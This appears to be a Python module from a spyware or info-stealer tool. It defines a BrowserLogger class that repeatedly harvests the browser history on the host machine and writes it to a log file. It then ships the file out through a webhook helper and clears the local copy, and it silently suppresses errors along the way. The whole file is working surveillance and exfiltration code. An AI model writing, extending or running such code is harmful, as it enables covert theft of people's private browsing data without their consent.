import browserhistory
import time

from config import BROWSER_LOG_INTERVAL_SEC

from utils.logging_utils import log_info, log_error, log_to_file
from utils.webhook_utils import send_log_file
from utils.file_utils import clear_log_file


class BrowserLogger:
    def __init__(self):
        log_info("Browser logger initialized.")
        self.log_file = "browser.txt"
        self.interval = BROWSER_LOG_INTERVAL_SEC
        self.running = True

    def log_browser(self):
        browser_histroy = browserhistory.get_browserhistory()
        try:
            if browser_histroy:
                for browser, history in browser_histroy.items():
                    for search in history:
                        log_to_file(
                            self.log_file, f"{search[2]}: {search[1]} ({search[0]})"
                        )
                    log_info(
                        f"Logged browser history: {search[2]}: {search[1]} ({search[0]})"
                    )
        except:
            pass

    def send_logs(self):
        send_log_file("`Sending browser logs...`", self.log_file)
        clear_log_file(self.log_file)
        log_info("Sent and cleared browser log file.")

    def run(self):
        try:
            while self.running:
                self.log_browser()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
